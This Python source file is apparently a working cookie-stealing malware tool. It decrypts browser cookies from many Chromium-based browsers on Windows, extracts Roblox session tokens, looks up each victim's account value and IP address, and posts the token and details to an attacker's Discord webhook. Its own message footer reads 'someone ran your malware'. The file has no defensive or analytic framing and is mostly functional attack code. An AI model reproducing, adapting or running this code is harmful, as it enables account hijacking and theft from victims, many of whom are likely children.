import json
import base64
import os
import shutil
import sqlite3
import requests
from pathlib import Path
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData


class KillaCookie:
    
    def __init__(self,furrypp):
        self.cookies = []
        appdata = os.getenv('LOCALAPPDATA')    
        
        paths = { appdata + '\\Amigo\\User Data\\Default\\Network\\Cookies', appdata + '\\Torch\\User Data\\Default\\Network\\Cookies', appdata + '\\Kometa\\User Data\\Default\\Network\\Cookies', appdata + '\\Orbitum\\User Data\\Default\\Network\\Cookies', appdata + '\\CentBrowser\\User Data\\Default\\Network\\Cookies', appdata + '\\7Star\\7Star\\User Data\\Default\\Network\\Cookies', appdata + '\\Sputnik\\Sputnik\\User Data\\Default\\Network\\Cookies', appdata + '\\Vivaldi\\User Data\\Default\\Network\\Cookies', appdata + '\\Google\\Chrome SxS\\User Data\\Default\\Network\\Cookies', appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies', appdata + '\\Epic Privacy Browser\\User Data\\Default\\Network\\Cookies', appdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies', appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Network\\Cookies', appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies', appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies', appdata + '\\Iridium\\User Data\\Default\\Network\\Cookies', }
        
        for path in paths:
            try:
                key = self.monkey(path.replace('\\Default\\Network\\Cookies','\\Local State'))
                shutil.copy(path, 'cleanme')
                self.clean(key)
            except:pass
        self.send(furrypp)
        
        
    def clean(self,key:str):
        conn = sqlite3.connect('cleanme')
        query = conn.cursor()
        query.execute('SELECT encrypted_value FROM cookies')
        for row in query.fetchall():
            dec_value = self.ilovedick(row[0], key)
            self.cookies.append(dec_value)
        conn.close()
        os.remove('cleanme')
        
    def ilovedick(self,buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        ciphertext = payload[:-16]
        tag = payload[-16:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decvalue = decryptor.update(ciphertext) + decryptor.finalize()
        decvalue = decvalue.decode()
        return decvalue

    def monkey(self,path:str) -> str:
        # haha get it cus monkey = money key which is like key ahahaha im going insane
        path = Path(path)
        with path.open("r", encoding="utf-8") as f:
            local_state = json.load(f)
        no_one_cares_about_this_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        monkey = CryptUnprotectData(no_one_cares_about_this_key, None, None, None, 0)[1]
        return monkey

    def send(self,furrypp:str):
        for v in self.cookies:
            if 'WARNING:-DO-NOT-SHARE-THIS' in v:
                try: 
                    r = requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':v}).json()
                    robux = r['RobuxBalance']
                    id = r['UserID']
                    thumbnail = r['ThumbnailUrl']
                    isprem = r['IsPremium']
                    username = r['UserName']
                    ip = requests.get('https://ipinfo.io/json').json()['ip']
                    rapk = requests.get(f'https://inventory.roblox.com/v1/users/{id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100').json()
                    rap = sum(v['recentAveragePrice'] for v in rapk['data'])
                    requests.post(furrypp,json={ "content": '', "embeds": [ { "color": 13290186, "footer": { "text": "someone ran your malware..." }, "image": { "url": "https://media.discordapp.net/attachments/1064377060920926238/1076378046547902504/a508ab3d51bdc339f2dd4cf9d4279fa8.png" } }, { "description": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id}/profile) | [Trade Link](https://www.roblox.com/users/{id}/trade)", "color": 13290186, "fields": [ { "name": "Robux", "value": f"{robux}", "inline": True }, { "name": "Rap", "value": f"{rap}", "inline": True }, { "name": "Premium", "value": f"{isprem}", "inline": True }, { "name": "Username", "value": f"{username}", "inline": True }, { "name": "UserID", "value": f"{id}", "inline": True }, { "name": "IP", "value": f"{ip}", "inline": True }, { "name": ".ROBLOSECURITY", "value": f"```fix\n{v}\n```" } ], "thumbnail": { "url": f"{thumbnail}" } } ], "username": "BOT - w0ck$tar", "avatar_url": "https://media.discordapp.net/attachments/984878895113306216/985497154921582602/pfps.jpg?width=314&height=559", "attachments": [] })
                except:pass

